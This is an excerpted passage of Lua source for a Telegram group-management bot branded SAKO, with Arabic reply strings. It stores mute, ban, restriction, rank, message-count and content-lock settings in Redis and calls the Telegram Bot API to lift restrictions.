if not RioConstructor(msg) and DevRio:get(SAKO.."Rio:Lock:MuteTked"..msg.chat_id_) then 
...
if DevRio:sismember(SAKO..'Rio:Muted:'..msg.chat_id_, result.sender_user_id_) then
ReplyStatus(msg,result.sender_user_id_,"Reply","᥀︙هو بالفعل مكتوم من المجموعه")  
else
DevRio:sadd(SAKO..'Rio:Muted:'..msg.chat_id_, result.sender_user_id_)
...
if DevRio:sismember(SAKO..'Rio:Muted:'..msg.chat_id_, result.id_) then
ReplyStatus(msg,result.id_,"Reply","᥀︙هو بالفعل مكتوم من المجموعه")  
else
DevRio:sadd(SAKO..'Rio:Muted:'..msg.chat_id_, result.id_)
...
if DevRio:sismember(SAKO..'Rio:Muted:'..msg.chat_id_, user) then
ReplyStatus(msg,user,"Reply","᥀︙هو بالفعل مكتوم من المجموعه")  
else
DevRio:sadd(SAKO..'Rio:Muted:'..msg.chat_id_, user)
...
if not DevRio:sismember(SAKO..'Rio:Muted:'..msg.chat_id_, result.sender_user_id_) then
ReplyStatus(msg,result.sender_user_id_,"Reply","᥀︙هو ليس مكتوم لالغاء كتمه")  
else
DevRio:srem(SAKO..'Rio:Muted:'..msg.chat_id_, result.sender_user_id_)
...
if result.id_ then
if not DevRio:sismember(SAKO..'Rio:Muted:'..msg.chat_id_, result.id_) then
ReplyStatus(msg,result.id_,"Reply","᥀︙هو ليس مكتوم لالغاء كتمه")  
else
DevRio:srem(SAKO..'Rio:Muted:'..msg.chat_id_, result.id_)
...
if not DevRio:sismember(SAKO..'Rio:Muted:'..msg.chat_id_, user) then
ReplyStatus(msg,user,"Reply","᥀︙هو ليس مكتوم لالغاء كتمه")  
else
DevRio:srem(SAKO..'Rio:Muted:'..msg.chat_id_, user)
...
DevRio:sadd(SAKO..'Rio:Tkeed:'..msg.chat_id_, result.sender_user_id_)
...
DevRio:sadd(SAKO..'Rio:Tkeed:'..msg.chat_id_, result.id_)
...
DevRio:sadd(SAKO..'Rio:Tkeed:'..msg.chat_id_, user)
...
DevRio:srem(SAKO..'Rio:Tkeed:'..msg.chat_id_, result.sender_user_id_)
...
DevRio:srem(SAKO..'Rio:Tkeed:'..msg.chat_id_, result.id_)
...
DevRio:srem(SAKO..'Rio:Tkeed:'..msg.chat_id_, user)
...
if DevRio:sismember(SAKO..'Rio:RioSudo:',result.sender_user_id_) and not Sudo(msg) then
Dev_Rio(msg.chat_id_, msg.id_, 1, "᥀︙*لاتستطيع حظر المطور الاساسي*", 1, 'md')
return false 
end
if DevRio:sismember(SAKO..'Rio:SecondSudo:',result.sender_user_id_) and not RioSudo(msg) then
Dev_Rio(msg.chat_id_, msg.id_, 1, "᥀︙*لاتستطيع حظر المطور الاساسي²*", 1, 'md')
return false 
end
ChatKick(result.chat_id_, result.sender_user_id_)
DevRio:sadd(SAKO..'Rio:BanAll:', result.sender_user_id_)
...
if DevRio:sismember(SAKO..'Rio:RioSudo:',result.id_) and not Sudo(msg) then
Dev_Rio(msg.chat_id_, msg.id_, 1, "᥀︙*لاتستطيع حظر المطور الاساسي*", 1, 'md')
return false 
end
if DevRio:sismember(SAKO..'Rio:SecondSudo:',result.id_) and not RioSudo(msg) then
Dev_Rio(msg.chat_id_, msg.id_, 1, "᥀︙*لاتستطيع حظر المطور الاساسي²*", 1, 'md')
return false 
end
if result.id_ then
ChatKick(msg.chat_id_, result.id_)
DevRio:sadd(SAKO..'Rio:BanAll:', result.id_)
...
if tonumber(user) == tonumber(SAKO) then  
Dev_Rio(msg.chat_id_, msg.id_, 1, "᥀︙*لاتستطيع حظر البوت عام*", 1, 'md')
return false 
end
...
if DevRio:sismember(SAKO..'Rio:RioSudo:',user) and not Sudo(msg) then
Dev_Rio(msg.chat_id_, msg.id_, 1, "᥀︙*لاتستطيع حظر المطور الاساسي*", 1, 'md')
return false 
end
if DevRio:sismember(SAKO..'Rio:SecondSudo:',user) and not RioSudo(msg) then
Dev_Rio(msg.chat_id_, msg.id_, 1, "᥀︙*لاتستطيع حظر المطور الاساسي²*", 1, 'md')
return false 
end
ChatKick(msg.chat_id_, user)
DevRio:sadd(SAKO..'Rio:BanAll:', user)
...
DevRio:sadd(SAKO..'Rio:MuteAll:', result.sender_user_id_)
...
if result.id_ then
DevRio:sadd(SAKO..'Rio:MuteAll:', result.id_)
...
DevRio:sadd(SAKO..'Rio:MuteAll:', user)
...
DevRio:srem(SAKO..'Rio:BanAll:', result.sender_user_id_)
DevRio:srem(SAKO..'Rio:MuteAll:', result.sender_user_id_)
...
if result.id_ then
DevRio:srem(SAKO..'Rio:BanAll:', result.id_)
DevRio:srem(SAKO..'Rio:MuteAll:', result.id_)
...
DevRio:srem(SAKO..'Rio:BanAll:', user)
DevRio:srem(SAKO..'Rio:MuteAll:', user)
...
DevRio:setex(SAKO.."Rio:EditDev"..msg.sender_user_id_,300,true)
end
if DevRio:get(SAKO.."Rio:EditDev"..msg.sender_user_id_) then
if text and text:match("^الغاء$") then 
send(msg.chat_id_, msg.id_,'᥀︙تم الغاء امر تغير المطور الاساسي')
DevRio:del(SAKO.."Rio:EditDev"..msg.sender_user_id_)
return false
end
if text and text:match("^(%d+)$") then 
...
if dp.first_name_ ~= false then
DevRio:del(SAKO.."Rio:EditDev"..msg.sender_user_id_)
DevRio:set(SAKO.."Rio:NewDev"..msg.sender_user_id_,dp.id_)
...
--     Source SAKO     --
if msg.reply_to_message_id_ ~= 0 then
if text and text:match("^رفع مطي$") and not DevRio:get(SAKO..'Rio:Lock:Stupid'..msg.chat_id_) and ChCheck(msg) then
function donky_by_reply(extra, result, success)
if DevRio:sismember(SAKO..'User:Donky:'..msg.chat_id_, result.sender_user_id_) then
ReplyStatus(msg,result.sender_user_id_,"Reply","᥀︙هو مطي شرفع منه بعد😹💔") 
else
ReplyStatus(msg,result.sender_user_id_,"Reply","᥀︙تم رفعه في قائمة المطايه") 
DevRio:sadd(SAKO..'User:Donky:'..msg.chat_id_, result.sender_user_id_)
end end
getMessage(msg.chat_id_, msg.reply_to_message_id_,donky_by_reply)
end end
--     Source SAKO     --
if msg.reply_to_message_id_ ~= 0  then
if text and text:match("^تنزيل مطي$") and not DevRio:get(SAKO..'Rio:Lock:Stupid'..msg.chat_id_) and ChCheck(msg) then
function donky_by_reply(extra, result, success)
if not DevRio:sismember(SAKO..'User:Donky:'..msg.chat_id_, result.sender_user_id_) then
ReplyStatus(msg,result.sender_user_id_,"Reply","᥀︙هو ليس مطي ليتم تنزيله") 
else
DevRio:srem(SAKO..'User:Donky:'..msg.chat_id_, result.sender_user_id_)
...
DevRio:set('SAKOTeam:'..SAKO..'id:user'..msg.chat_id_,TXT)  
DevRio:setex('SAKOTeam:'..SAKO.."numadd:user"..msg.chat_id_.."" .. msg.sender_user_id_, 300, true)  
...
DevRio:del(SAKO..'Rio:UsersMsgs'..msg.chat_id_..':'..result.sender_user_id_) 
DevRio:incrby(SAKO..'Rio:UsersMsgs'..msg.chat_id_..':'..result.sender_user_id_,Num) 
...
DevRio:set('SAKOTeam:'..SAKO..'ids:user'..msg.chat_id_,TXT)  
DevRio:setex('SAKOTeam:'..SAKO.."nmadd:user"..msg.chat_id_.."" .. msg.sender_user_id_, 300, true)  
...
function Reply(extra, result, success)
DevRio:incrby(SAKO..'Rio:GamesNumber'..msg.chat_id_..result.sender_user_id_,Num) 
Dev_Rio(msg.chat_id_, msg.id_, 1, "᥀︙تم اضافة "..Num..' نقطه', 1, 'md') 
end
tdcli_function ({ID = "GetMessage",chat_id_=msg.chat_id_,message_id_=tonumber(msg.reply_to_message_id_)},Reply, nil)
return false
end
if DevRio:get(SAKO..'Rio:Lock:Clean'..msg.chat_id_) then if msg.content_.video_ or msg.content_.document_ or msg.content_.sticker_ or msg.content_.photo_ or msg.content_.animation_ or msg.content_.animated_ then if msg.reply_to_message_id_ ~= 0 then DevRio:sadd(SAKO.."Rio:cleaner"..msg.chat_id_, msg.id_) else DevRio:sadd(SAKO.."Rio:cleaner"..msg.chat_id_, msg.id_) end end end
if DevRio:get(SAKO..'Rio:Lock:CleanNum'..msg.chat_id_) then if msg.content_.video_ or msg.content_.document_ or msg.content_.sticker_ or msg.content_.photo_ or msg.content_.animation_ or msg.content_.animated_ then if msg.reply_to_message_id_ ~= 0 then DevRio:sadd(SAKO.."Rio:cleanernum"..msg.chat_id_, msg.id_) else DevRio:sadd(SAKO.."Rio:cleanernum"..msg.chat_id_, msg.id_) end end end
if DevRio:get(SAKO..'Rio:Lock:CleanMusic'..msg.chat_id_) then if msg.content_.voice_ or msg.content_.audio_ then if msg.reply_to_message_id_ ~= 0 then DevRio:sadd(SAKO.."Rio:cleanermusic"..msg.chat_id_, msg.id_) else DevRio:sadd(SAKO.."Rio:cleanermusic"..msg.chat_id_, msg.id_) end end end
if Manager(msg) and msg.reply_to_message_id_ ~= 0 then
if text and text:match("^تثبيت$") and ChCheck(msg) then 
if DevRio:sismember(SAKO.."Rio:Lock:Pinpin",msg.chat_id_) and not BasicConstructor(msg) then
...
if data.ID == "Ok" then
DevRio:set(SAKO..'Rio:PinnedMsg'..msg.chat_id_,msg.reply_to_message_id_)
...
local List = DevRio:smembers(SAKO..'Rio:VipMem:'..msg.chat_id_)
text = "᥀︙قائمة المميزين ↫ ⤈ \n┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉\n"
for k,v in pairs(List) do
local username = DevRio:get(SAKO..'Save:UserName'..v)
if username then
...
local List = DevRio:smembers(SAKO..rio)
text = "᥀︙قائمة الادمنيه ↫ ⤈ \n┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉\n"
for k,v in pairs(List) do
local username = DevRio:get(SAKO..'Save:UserName'..v)
if username then
...
local List = DevRio:smembers(SAKO..'Rio:Managers:'..msg.chat_id_)
text = "᥀︙قائمة المدراء ↫ ⤈ \n┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉\n"
for k,v in pairs(List) do
local username = DevRio:get(SAKO..'Save:UserName'..v)
if username then
...
local List = DevRio:smembers(SAKO..'Rio:Cleaner:'..msg.chat_id_)
text = "᥀︙قائمة المنظفين ↫ ⤈ \n┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉\n"
for k,v in pairs(List) do
local username = DevRio:get(SAKO..'Save:UserName'..v)
if username then
...
local List = DevRio:smembers(SAKO..'Rio:Constructor:'..msg.chat_id_)
text = "᥀︙قائمة المنشئين ↫ ⤈ \n┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉\n"
for k,v in pairs(List) do
local username = DevRio:get(SAKO..'Save:UserName'..v)
if username then
...
local List = DevRio:smembers(SAKO..'Rio:Owner:'..msg.chat_id_)
text = "᥀︙قائمة المالكين ↫ ⤈ \n┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉\n"
for k,v in pairs(List) do
local username = DevRio:get(SAKO..'Save:UserName'..v)
if username then
...
local List = DevRio:smembers(SAKO..'Rio:BasicConstructor:'..msg.chat_id_)
...
local List = DevRio:smembers(SAKO..'Rio:Muted:'..msg.chat_id_)
...
local List = DevRio:smembers(SAKO..'Rio:Tkeed:'..msg.chat_id_)
text = "᥀︙قائمة المقيدين ↫ ⤈ \n┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉\n"
for k,v in pairs(List) do
local username = DevRio:get(SAKO..'Save:UserName'..v)
if username then
...
local List = DevRio:smembers(SAKO..'Rio:Ban:'..msg.chat_id_)
...
local List = DevRio:smembers(SAKO..'User:Donky:'..msg.chat_id_)
...
local List = DevRio:hkeys(SAKO..'Rio:Filters:'..msg.chat_id_)
text = "᥀︙قائمة المنع ↫ ⤈ \n┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉\n"
for k, v in pairs(List) do
text = text..k..'~ ❨ '..v..' ❩\n'
end
...
local List = DevRio:smembers(SAKO..'Rio:RioSudo:')
...
local List = DevRio:smembers(SAKO..'Rio:SecondSudo:')
...
local BanAll = DevRio:smembers(SAKO..'Rio:BanAll:')
local MuteAll = DevRio:smembers(SAKO..'Rio:MuteAll:')
if #BanAll ~= 0 then 
...
local List = DevRio:smembers(SAKO..'Rio:SudoBot:')
text = "᥀︙قائمة المطورين ↫ ⤈ \n┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉\n"
for k,v in pairs(List) do
local sudouser = DevRio:get(SAKO..'Rio:Sudos'..v) 
local username = DevRio:get(SAKO..'Save:UserName'..v)
if username then
...
DevRio:sadd(SAKO.."Rio:RioConstructor:"..msg.chat_id_,dp.id_)
end,nil)   
end,nil)   
end
end 
...
if result.content_.sticker_ then
local idsticker = result.content_.sticker_.sticker_.persistent_id_
DevRio:srem(SAKO.."Rio:FilterSteckr"..msg.chat_id_,idsticker)
Dev_Rio(msg.chat_id_, msg.id_, 1, '᥀︙تم الغاء منع الملصق يمكنهم ارساله الان', 1, 'md')
return false
end
if result.content_.ID == "MessagePhoto" then
local photo = result.content_.photo_.id_
DevRio:srem(SAKO.."Rio:FilterPhoto"..msg.chat_id_,photo)
Dev_Rio(msg.chat_id_, msg.id_, 1, '᥀︙تم الغاء منع الصوره يمكنهم ارسالها الان', 1, 'md')
return false
end
if result.content_.animation_.animation_ then
local idanimation = result.content_.animation_.animation_.persistent_id_
DevRio:srem(SAKO.."Rio:FilterAnimation"..msg.chat_id_,idanimation)
...
riomoned(msg.chat_id_, msg.sender_user_id_, msg.id_, SAKOTeam, 14, string.len(msg.sender_user_id_))
DevRio:del(SAKO..'Rio:Thwel:Rio'..msg.chat_id_) 
end
if text and (text == "تعطيل تحويل الصيغ" or text == "تعطيل التحويل") and Manager(msg) and ChCheck(msg) then
local SAKOTeam = '᥀︙اهلا عزيزي ↫ '..RioRank(msg)..' \n᥀︙تم تعطيل تحويل الصيغ'
riomoned(msg.chat_id_, msg.sender_user_id_, msg.id_, SAKOTeam, 14, string.len(msg.sender_user_id_))
DevRio:set(SAKO..'Rio:Thwel:Rio'..msg.chat_id_,true)  
end
if text == 'تحويل' and not DevRio:get(SAKO..'Rio:Thwel:Rio'..msg.chat_id_) then  
if tonumber(msg.reply_to_message_id_) > 0 then 
...
tdcli_function ({ID = "GetUser",user_id_ = result.sender_user_id_},function(arg,data) 
local user_msgs = DevRio:get(SAKO..'Rio:UsersMsgs'..msg.chat_id_..':'..data.id_) or 0
local user_nkt = tonumber(DevRio:get(SAKO..'Rio:GamesNumber'..msg.chat_id_..data.id_) or 0)
if DevRio:sismember(SAKO..'Rio:BanAll:',result.sender_user_id_) then
Tkeed = 'محظور عام'
elseif DevRio:sismember(SAKO..'Rio:MuteAll:',result.sender_user_id_) then
Tkeed = 'مكتوم عام'
elseif DevRio:sismember(SAKO..'Rio:Ban:'..msg.chat_id_,result.sender_user_id_) then
Tkeed = 'محظور'
elseif DevRio:sismember(SAKO..'Rio:Muted:'..msg.chat_id_,result.sender_user_id_) then
Tkeed = 'مكتوم'
elseif DevRio:sismember(SAKO..'Rio:Tkeed:'..msg.chat_id_,result.sender_user_id_) then
Tkeed = 'مقيد'
else
Tkeed = false
end
...
if DevRio:sismember(SAKO..'Rio:SudoBot:',result.sender_user_id_) and SudoBot(msg) then
sudobot = '\n᥀︙عدد الكروبات ↫ '..(DevRio:get(SAKO..'Rio:Sudos'..result.sender_user_id_) or 0)..'' 
else 
sudobot = '' 
end
...
local user_msgs = DevRio:get(SAKO..'Rio:UsersMsgs'..msg.chat_id_..':'..res.id_) or 0
local user_nkt = tonumber(DevRio:get(SAKO..'Rio:GamesNumber'..msg.chat_id_..res.id_) or 0)
if DevRio:sismember(SAKO..'Rio:BanAll:',res.id_) then
Tkeed = 'محظور عام'
elseif DevRio:sismember(SAKO..'Rio:MuteAll:',res.id_) then
Tkeed = 'مكتوم عام'
elseif DevRio:sismember(SAKO..'Rio:Ban:'..msg.chat_id_,res.id_) then
Tkeed = 'محظور'
elseif DevRio:sismember(SAKO..'Rio:Muted:'..msg.chat_id_,res.id_) then
Tkeed = 'مكتوم'
elseif DevRio:sismember(SAKO..'Rio:Tkeed:'..msg.chat_id_,res.id_) then
Tkeed = 'مقيد'
else
Tkeed = false
end
...
if DevRio:sismember(SAKO..'Rio:SudoBot:',res.id_) and SudoBot(msg) then
sudobot = '\n᥀︙عدد الكروبات ↫ '..(DevRio:get(SAKO..'Rio:Sudos'..res.id_) or 0)..'' 
else 
sudobot = '' 
end
...
local user_msgs = DevRio:get(SAKO..'Rio:UsersMsgs'..msg.chat_id_..':'..iduser) or 0
local user_nkt = tonumber(DevRio:get(SAKO..'Rio:GamesNumber'..msg.chat_id_..iduser) or 0)
if DevRio:sismember(SAKO..'Rio:BanAll:',iduser) then
Tkeed = 'محظور عام'
elseif DevRio:sismember(SAKO..'Rio:MuteAll:',iduser) then
Tkeed = 'مكتوم عام'
elseif DevRio:sismember(SAKO..'Rio:Ban:'..msg.chat_id_,iduser) then
Tkeed = 'محظور'
elseif DevRio:sismember(SAKO..'Rio:Muted:'..msg.chat_id_,iduser) then
Tkeed = 'مكتوم'
elseif DevRio:sismember(SAKO..'Rio:Tkeed:'..msg.chat_id_,iduser) then
Tkeed = 'مقيد'
else
Tkeed = false
end
...
if DevRio:sismember(SAKO..'Rio:SudoBot:',iduser) and SudoBot(msg) then
sudobot = '\n᥀︙عدد الكروبات ↫ '..(DevRio:get(SAKO..'Rio:Sudos'..iduser) or 0)..'' 
else 
sudobot = '' 
end
...
if DevRio:sismember(SAKO..'Rio:Muted:'..msg.chat_id_,result.sender_user_id_) then muted = 'مكتوم' else muted = 'غير مكتوم' end
if DevRio:sismember(SAKO..'Rio:Ban:'..msg.chat_id_,result.sender_user_id_) then banned = 'محظور' else banned = 'غير محظور' end
if DevRio:sismember(SAKO..'Rio:BanAll:',result.sender_user_id_) then banall = 'محظور عام' else banall = 'غير محظور عام' end
if DevRio:sismember(SAKO..'Rio:MuteAll:',result.sender_user_id_) then muteall = 'مكتوم عام' else muteall = 'غير مكتوم عام' end
if DevRio:sismember(SAKO..'Rio:Tkeed:',result.sender_user_id_) then tkeed = 'مقيد' else tkeed = 'غير مقيد' end
...
if result.id_ then
if DevRio:sismember(SAKO..'Rio:Muted:'..msg.chat_id_,result.id_) then muted = 'مكتوم' else muted = 'غير مكتوم' end
if DevRio:sismember(SAKO..'Rio:Ban:'..msg.chat_id_,result.id_) then banned = 'محظور' else banned = 'غير محظور' end
if DevRio:sismember(SAKO..'Rio:BanAll:',result.id_) then banall = 'محظور عام' else banall = 'غير محظور عام' end
if DevRio:sismember(SAKO..'Rio:MuteAll:',result.id_) then muteall = 'مكتوم عام' else muteall = 'غير مكتوم عام' end
if DevRio:sismember(SAKO..'Rio:Tkeed:',result.id_) then tkeed = 'مقيد' else tkeed = 'غير مقيد' end
Dev_Rio(msg.chat_id_, msg.id_, 1, '᥀︙الحظر العام ↫ '..banall..'\n᥀︙الكتم العام ↫ '..muteall..'\n᥀︙الحظر ↫ '..banned..'\n᥀︙الكتم ↫ '..muted..'\n᥀︙التقيد ↫ '..tkeed, 1, 'md')  
else
Dev_Rio(msg.chat_id_, msg.id_, 1, '᥀︙*المعرف غير صحيح*', 1, 'md')  
end
...
if SecondSudo(msg) then
HTTPS.request("https://api.telegram.org/bot"..TokenBot.."/restrictChatMember?chat_id="..msg.chat_id_.."&user_id=" ..result.sender_user_id_.. "&can_send_messages=True&can_send_media_messages=True&can_send_other_messages=True&can_add_web_page_previews=True")  
DevRio:srem(SAKO..'Rio:Tkeed:'..msg.chat_id_,result.sender_user_id_) DevRio:srem(SAKO..'Rio:Ban:'..msg.chat_id_,result.sender_user_id_) DevRio:srem(SAKO..'Rio:Muted:'..msg.chat_id_,result.sender_user_id_) DevRio:srem(SAKO..'Rio:BanAll:',result.sender_user_id_) DevRio:srem(SAKO..'Rio:MuteAll:',result.sender_user_id_)
else
HTTPS.request("https://api.telegram.org/bot"..TokenBot.."/restrictChatMember?chat_id="..msg.chat_id_.."&user_id=" ..result.sender_user_id_.. "&can_send_messages=True&can_send_media_messages=True&can_send_other_messages=True&can_add_web_page_previews=True")  
DevRio:srem(SAKO..'Rio:Tkeed:'..msg.chat_id_,result.sender_user_id_) DevRio:srem(SAKO..'Rio:Ban:'..msg.chat_id_,result.sender_user_id_) DevRio:srem(SAKO..'Rio:Muted:'..msg.chat_id_,result.sender_user_id_) 
end
end
getMessage(msg.chat_id_, tonumber(msg.reply_to_message_id_),unbanreply) 
end
...
if SecondSudo(msg) then
HTTPS.request("https://api.telegram.org/bot"..TokenBot.."/restrictChatMember?chat_id="..msg.chat_id_.."&user_id=" ..user.. "&can_send_messages=True&can_send_media_messages=True&can_send_other_messages=True&can_add_web_page_previews=True")  
DevRio:srem(SAKO..'Rio:Tkeed:'..msg.chat_id_,user) DevRio:srem(SAKO..'Rio:Ban:'..msg.chat_id_,user) DevRio:srem(SAKO..'Rio:Muted:'..msg.chat_id_,user) DevRio:srem(SAKO..'Rio:BanAll:',user) DevRio:srem(SAKO..'Rio:MuteAll:',user)
else
HTTPS.request("https://api.telegram.org/bot"..TokenBot.."/restrictChatMember?chat_id="..msg.chat_id_.."&user_id=" ..user.. "&can_send_messages=True&can_send_media_messages=True&can_send_other_messages=True&can_add_web_page_previews=True")  
DevRio:srem(SAKO..'Rio:Tkeed:'..msg.chat_id_,user) DevRio:srem(SAKO..'Rio:Ban:'..msg.chat_id_,user) DevRio:srem(SAKO..'Rio:Muted:'..msg.chat_id_,user) 
end  
end,nil)  
end
...
if SecondSudo(msg) then
HTTPS.request("https://api.telegram.org/bot"..TokenBot.."/restrictChatMember?chat_id="..msg.chat_id_.."&user_id=" ..result.id_.. "&can_send_messages=True&can_send_media_messages=True&can_send_other_messages=True&can_add_web_page_previews=True")  
DevRio:srem(SAKO..'Rio:Tkeed:'..msg.chat_id_,result.id_) DevRio:srem(SAKO..'Rio:Ban:'..msg.chat_id_,result.id_) DevRio:srem(SAKO..'Rio:Muted:'..msg.chat_id_,result.id_) DevRio:srem(SAKO..'Rio:BanAll:',result.id_) DevRio:srem(SAKO..'Rio:MuteAll:',result.id_)
else
HTTPS.request("https://api.telegram.org/bot"..TokenBot.."/restrictChatMember?chat_id="..msg.chat_id_.."&user_id=" ..result.id_.. "&can_send_messages=True&can_send_media_messages=True&can_send_other_messages=True&can_add_web_page_previews=True")  
DevRio:srem(SAKO..'Rio:Tkeed:'..msg.chat_id_,result.id_) DevRio:srem(SAKO..'Rio:Ban:'..msg.chat_id_,result.id_) DevRio:srem(SAKO..'Rio:Muted:'..msg.chat_id_,result.id_) 
end
end,nil)   
end  
...
DevRio:set(SAKO.."Rio:GpIds:Text"..msg.chat_id_,Text_Rand)
...
DevRio:set("SAKO:New:id:"..SAKO..msg.sender_user_id_,'SAKOTeam')
return "SAKOTeam"
end
if text and DevRio:get("SAKO:New:id:"..SAKO..msg.sender_user_id_) then 
if text == 'الغاء' then   
Dev_Rio(msg.chat_id_, msg.id_, 1, '᥀︙تم الغاء حفظ كليشة الايدي', 1, 'md')
DevRio:del("SAKO:New:id:"..SAKO..msg.sender_user_id_)
return false
end
DevRio:del("SAKO:New:id:"..SAKO..msg.sender_user_id_)
Dev_Rio(msg.chat_id_, msg.id_, 1, '᥀︙تم حفظ كليشة الايدي العامه', 1, 'md')
DevRio:set(SAKO.."Rio:AllIds:Text",text)
return false
end
...
DevRio:del(SAKO.."Rio:AllIds:Text")
end
end
--     Source SAKO     --
if text and text:match("^تعيين الايدي$") and ChCheck(msg) or text and text:match("^تعين الايدي$") and ChCheck(msg) then
Dev_Rio(msg.chat_id_, msg.id_, 1, '᥀︙رجائا اتبع التعليمات للتعيين \n᥀︙لطبع كليشة الايدي ارسل كليشه تحتوي على النصوص التي باللغه الانجليزيه ادناه ↫ ⤈\n┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉\n `#username` ↬ لطبع المعرف\n `#id` ↬ لطبع الايدي \n `#photos` ↬ لطبع عدد الصور \n `#stast` ↬ لطبع الرتب \n `#msgs` ↬ لطبع عدد الرسائل \n `#msgday` ↬ لطبع الرسائل اليوميه \n `#CustomTitle` ↬ لطبع اللقب \n `#bio` ↬ لطبع البايو \n `#auto` ↬ لطبع التفاعل \n `#game` ↬ لطبع عدد النقاط \n `#cont` ↬ لطبع عدد الجهات \n `#edit` ↬ لطبع عدد السحكات \n `#Description` ↬ لطبع تعليق الصور\n┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉', 1, 'md')
DevRio:set("SAKO:New:id:"..SAKO..msg.chat_id_..msg.sender_user_id_,'SAKOTeam')
return "SAKOTeam"
end
if text and Manager(msg) and DevRio:get("SAKO:New:id:"..SAKO..msg.chat_id_..msg.sender_user_id_) then 
if text == 'الغاء' then   
Dev_Rio(msg.chat_id_, msg.id_, 1, '᥀︙تم الغاء حفظ كليشة الايدي', 1, 'md')
DevRio:del("SAKO:New:id:"..SAKO..msg.chat_id_..msg.sender_user_id_)
return false
end
DevRio:del("SAKO:New:id:"..SAKO..msg.chat_id_..msg.sender_user_id_)
Dev_Rio(msg.chat_id_, msg.id_, 1, '᥀︙تم حفظ الكليشه الجديده', 1, 'md')
DevRio:set(SAKO.."Rio:GpIds:Text"..msg.chat_id_,text)
return false
end
if text and text:match("^حذف الايدي$") and ChCheck(msg) or text and text:match("^مسح الايدي$") and ChCheck(msg) then
ReplyStatus(msg,msg.sender_user_id_,"ReplyBy","᥀︙تم حذف كليشة الايدي")  
DevRio:del(SAKO.."Rio:GpIds:Text"..msg.chat_id_)
end
end
--     Source SAKO     --
if msg.reply_to_message_id_ ~= 0 then
...
function SAKOTeam(extra,rio,success)
...
local msgsday = DevRio:get(SAKO..'Rio:UsersMsgs'..SAKO..os.date('%d')..':'..msg.chat_id_..':'..msg.sender_user_id_) or 0
local edit_msg = DevRio:get(SAKO..'Rio:EditMsg'..msg.chat_id_..msg.sender_user_id_) or 0
local user_msgs = DevRio:get(SAKO..'Rio:UsersMsgs'..msg.chat_id_..':'..msg.sender_user_id_)
local user_nkt = tonumber(DevRio:get(SAKO..'Rio:GamesNumber'..msg.chat_id_..msg.sender_user_id_) or 0)
local cont = (tonumber(DevRio:get(SAKO..'Rio:ContactNumber'..msg.chat_id_..':'..msg.sender_user_id_)) or 0)
...
if not DevRio:get(SAKO..'Rio:Lock:Id'..msg.chat_id_) then 
if not DevRio:get(SAKO..'Rio:Lock:Id:Photo'..msg.chat_id_) then 
if DevRio:get(SAKO.."Rio:AllIds:Text") then
newpicid = DevRio:get(SAKO.."Rio:AllIds:Text")
...
if not DevRio:get(SAKO.."Rio:GpIds:Text"..msg.chat_id_) then 
sendPhoto(msg.chat_id_, msg.id_, 0, 1, nil, rio.photos_[0].sizes_[1].photo_.persistent_id_,newpicid,msg.id_,msg.id_.."")
else 
local new_id = DevRio:get(SAKO.."Rio:GpIds:Text"..msg.chat_id_)
...
if DevRio:get(SAKO.."Rio:AllIds:Text") then
newallid = DevRio:get(SAKO.."Rio:AllIds:Text")
...
if DevRio:get(SAKO.."Rio:AllIds:Text") then
notpicid = DevRio:get(SAKO.."Rio:AllIds:Text")
...
if not DevRio:get(SAKO..'Rio:Lock:EditMsgs'..msg.chat_id_) then
ReplyStatus(msg,msg.sender_user_id_,"ReplyBy","᥀︙تم قفل التعديل")  
DevRio:set(SAKO..'Rio:Lock:EditMsgs'..msg.chat_id_,true)
else
...
DevRio:set(SAKO.."Rio:Lock:Bots"..msg.chat_id_,"ked")  
end
if LockText[2] == "التكرار" or LockText[2] == "التكرار بالحذف" then 
DevRio:hset(SAKO.."Rio:Spam:Group:User"..msg.chat_id_ ,"Spam:User","del")  
ReplyStatus(msg,msg.sender_user_id_,"ReplyBy","᥀︙تم قفل التكرار بالحذف")  
end
if LockText[2] == "التكرار بالطرد" then 
DevRio:hset(SAKO.."Rio:Spam:Group:User"..msg.chat_id_ ,"Spam:User","kick")  
...
DevRio:hset(SAKO.."Rio:Spam:Group:User"..msg.chat_id_ ,"Spam:User","keed")  
ReplyStatus(msg,msg.sender_user_id_,"ReplyBy","᥀︙تم قفل التكرار بالتقيد")  
end
if LockText[2] == "التكرار بالكتم" then 
DevRio:hset(SAKO.."Rio:Spam:Group:User"..msg.chat_id_ ,"Spam:User","mute")  
ReplyStatus(msg,msg.sender_user_id_,"ReplyBy","᥀︙تم قفل التكرار بالكتم")  
end
if BasicConstructor(msg) then
if LockText[2] == "التثبيت" then
if not DevRio:get(SAKO..'Rio:Lock:Pin'..msg.chat_id_) then
tdcli_function ({ ID = "GetChannelFull",  channel_id_ = msg.chat_id_:gsub("-100","") }, function(arg,data)  DevRio:set(SAKO.."Rio:PinnedMsg"..msg.chat_id_,data.pinned_message_id_)  end,nil)
ReplyStatus(msg,msg.sender_user_id_,"ReplyBy","᥀︙تم قفل التثبيت")  
DevRio:set(SAKO..'Rio:Lock:Pin'..msg.chat_id_,true)
DevRio:sadd(SAKO.."Rio:Lock:Pinpin",msg.chat_id_) 
else
...
DevRio:hset(SAKO.."Rio:Spam:Group:User"..msg.chat_id_ ,"Num:Spam" ,TextSpam) 
end
end
if text and (text:match("^ضع زمن التكرار (%d+)$") or text:match("^وضع زمن التكرار (%d+)$")) then  
local TextSpam = text:match("ضع زمن التكرار (%d+)$") or text:match("وضع زمن التكرار (%d+)$")
DevRio:hset(SAKO.."Rio:Spam:Group:User"..msg.chat_id_ ,"Num:Spam:Time" ,TextSpam) 
...
riomoned(msg.chat_id_, msg.sender_user_id_, msg.id_, SAKOTeam, 14, string.len(msg.sender_user_id_))
DevRio:del(SAKO..'Rio:Lock:Id:Photo'..msg.chat_id_)
end end
if text and text == 'تعطيل الايدي بالصوره' and ChCheck(msg) then
if DevRio:get(SAKO..'Rio:Lock:Id:Photo'..msg.chat_id_) then
